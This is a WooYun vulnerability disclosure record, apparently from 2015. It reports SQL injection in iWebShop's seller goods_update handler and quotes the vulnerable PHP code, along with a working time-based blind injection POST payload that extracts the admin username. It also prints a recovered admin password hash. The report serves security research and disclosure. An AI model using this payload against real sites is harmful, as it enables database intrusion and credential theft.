{"id": 39335, "wybug_id": "wooyun-2015-094282", "wybug_title": "Iwebshop最新版多个SQL注入漏洞打包", "wybug_corp": "jooyea.net", "wybug_author": "路人甲", "wybug_date": "2015-04-09 12:38", "wybug_open_date": "2015-07-13 12:40", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-14：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-06-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-13：\t细节向公众公开  简要描述： Iwebshop最新版多个SQL注入漏洞打包 详细说明：  看到wooyun上有人提了几个iweshop（2014-11-18更新）的漏洞（ WooYun: iWebShop开源电子商务系统SQL注入漏洞 ），去官网看了看，在2014-12-16 已更新到了 iwebshop2.9.14121000，下下来研究研究，希望不要重复。注入一枚：POST /index.php?controller=seller&action=goods_update  POST参数中的多个参数存在注入，如_goods_no，_market_price，_sell_price，_cost_price，_weight，我些参数都存在注入，证明如下图\n\n问题文件在/controllers/seller.php的goods_update()方法中下面以weight为例进行说明看看代码/controllers/seller.php\n//商品更新动作\tpublic function goods_update()\t{\t\t$id       = IFilter::act(IReq::get('id'),'int');\t\t$callback = IFilter::act(IReq::get('callback'),'url');\t\t$callback = strpos($callback,'seller/goods_list') === false ? '' : $callback;\t\t//检查表单提交状态\t\tif(!$_POST)\t\t{\t\t\tdie('请确认表单提交正确');\t\t}\t\t//初始化商品数据\t\tunset($_POST['id']);\t\tunset($_POST['callback']);\t\t$goodsObject = new goods_class($this->seller['seller_id']);\t\t$goodsObject->update($id,$_POST);\t\t$callback ? $this->redirect($callback) : $this->redirect(\"goods_list\");\t}\n再去看看update\npublic function update($id,$paramData)\t{\t\t$postData = array();\t\t$nowDataTime = ITime::getDateTime();\t\tforeach($paramData as $key => $val)\t\t{\t\t\t$postData[$key] = $val;\t\t\t//数据过滤分组\t\t\tif(strpos($key,'attr_id_') !== false)\t\t\t{\t\t\t\t$goodsAttrData[ltrim($key,'attr_id_')] = IFilter::act($val);\t\t\t}\t\t\telse if($key[0] != '_')\t\t\t{\t\t\t\t$goodsUpdateData[$key] = IFilter::act($val,'text');\t\t\t}\t\t}\t\t//商家发布商品默认设置\t\tif($this->seller_id)\t\t{\t\t\t$goodsUpdateData['seller_id'] = $this->seller_id;\t\t\t$goodsUpdateData['is_del'] = $goodsUpdateData['is_del'] == 2 ? 2 : 3;\t\t}\t\t//上架或者下架处理\t\tif(isset($goodsUpdateData['is_del']))\t\t{\t\t\t//上架\t\t\tif($goodsUpdateData['is_del'] == 0)\t\t\t{\t\t\t\t$goodsUpdateData['up_time']   = $nowDataTime;\t\t\t\t$goodsUpdateData['down_time'] = null;\t\t\t}\t\t\t//下架\t\t\telse if($goodsUpdateData['is_del'] == 2)\t\t\t{\t\t\t\t$goodsUpdateData['up_time']  = null;\t\t\t\t$goodsUpdateData['down_time']= $nowDataTime;\t\t\t}\t\t\t//审核或者删除\t\t\telse\t\t\t{\t\t\t\t$goodsUpdateData['up_time']   = null;\t\t\t\t$goodsUpdateData['down_time'] = null;\t\t\t}\t\t}\t\t//是否存在货品\t\t$goodsUpdateData['spec_array'] = '';\t\tif(isset($postData['_spec_array']))\t\t{\t\t\t//生成goods中的spec_array字段数据\t\t\t$goods_spec_array = array();\t\t\tforeach($postData['_spec_array'] as $key => $val)\t\t\t{\t\t\t\tforeach($val as $v)\t\t\t\t{\t\t\t\t\t$tempSpec = JSON::decode($v);\t\t\t\t\tif(!isset($goods_spec_array[$tempSpec['id']]))\t\t\t\t\t{\t\t\t\t\t\t$goods_spec_array[$tempSpec['id']] = array('id' => $tempSpec['id'],'name' => $tempSpec['name'],'type' => $tempSpec['type'],'value' => array());\t\t\t\t\t}\t\t\t\t\t$goods_spec_array[$tempSpec['id']]['value'][] = $tempSpec['value'];\t\t\t\t}\t\t\t}\t\t\tforeach($goods_spec_array as $key => $val)\t\t\t{\t\t\t\t$val['value'] = array_unique($val['value']);\t\t\t\t$goods_spec_array[$key]['value'] = join(',',$val['value']);\t\t\t}\t\t\t$goodsUpdateData['spec_array'] = JSON::encode($goods_spec_array);\t\t}\t\t$goodsUpdateData['goods_no']     = preg_replace(\"/(?:\\-\\d*)$/\",\"\",current($postData['_goods_no']));\t\t$goodsUpdateData['store_nums']   = array_sum($postData['_store_nums']);\t\t$goodsUpdateData['market_price'] = isset($postData['_market_price']) ? current($postData['_market_price']) : 0;\t\t$goodsUpdateData['sell_price']   = isset($postData['_sell_price'])   ? current($postData['_sell_price'])   : 0;\t\t$goodsUpdateData['cost_price']   = isset($postData['_cost_price'])   ? current($postData['_cost_price'])   : 0;\t\t$goodsUpdateData['weight']       = isset($postData['_weight'])       ? current($postData['_weight'])       : 0;\t\t//处理商品\t\t$goodsDB = new IModel('goods');\t\tif($id)\t\t{\t\t\t$goodsDB->setData($goodsUpdateData);\t\t\t$where = \" id = {$id} \";\t\t\tif($this->seller_id)\t\t\t{\t\t\t\t$where .= \" and seller_id = \".$this->seller_id;\t\t\t}\t\t\tif(!$goodsDB->update($where))\t\t\t{\t\t\t\treturn false;\t\t\t}\t\t}\t\telse\t\t{\t\t\t$goodsUpdateData['create_time'] = $nowDataTime;\t\t\t$goodsDB->setData($goodsUpdateData);\t\t\t$id = $goodsDB->add();\t\t}无关代码\n看到这几句话\n$goodsUpdateData['goods_no']     = preg_replace(\"/(?:\\-\\d*)$/\",\"\",current($postData['_goods_no']));\t\t$goodsUpdateData['store_nums']   = array_sum($postData['_store_nums']);\t\t$goodsUpdateData['market_price'] = isset($postData['_market_price']) ? current($postData['_market_price']) : 0;\t\t$goodsUpdateData['sell_price']   = isset($postData['_sell_price'])   ? current($postData['_sell_price'])   : 0;\t\t$goodsUpdateData['cost_price']   = isset($postData['_cost_price'])   ? current($postData['_cost_price'])   : 0;\t\t$goodsUpdateData['weight']       = isset($postData['_weight'])       ? current($postData['_weight'])       : 0;\npostData中的值是没有经过过滤的，存在注入测试方法：申请开店后，登录，添加商品时存在注入Payload:POST提交\nid=&img=&_imgList=&callback=%2Fseller%2Fregiment_edit%2Fid%2F1&name=&search_words=&sort=99&unit=%E5%8D%83%E5%85%8B&_goods_no%5B0%5D=SD142193979843&_store_nums%5B0%5D=100&_market_price%5B0%5D=&_sell_price%5B0%5D=&_cost_price%5B0%5D=&_weight%5B0%5D='or(select if(ord(mid((select admin_name from iwebshop_admin limit 0,1),1,1))=97,sleep(1),0)) or '&model_id=0&brand_id=0&is_del=3&content=&keywords=%E6%B5%8B%E8%AF%95%E5%95%86%E5%93%811&description=aaaa\n因为是time-based blind 注入，猜测管理员用户名的第一个字母时，若错误，延迟2s左右，如下图\n\n若正确，延迟3s左右，如下图\n\n按上面的方法依次做下去（burp intruder或者自己写个脚本跑），可测试管理员用户名为：admin，密码为： f6fdffe48c908deb0f4c3bd36c032e72   漏洞证明：  见 详细说明    修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-07-13 12:40 厂商回复：  漏洞Rank：8  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}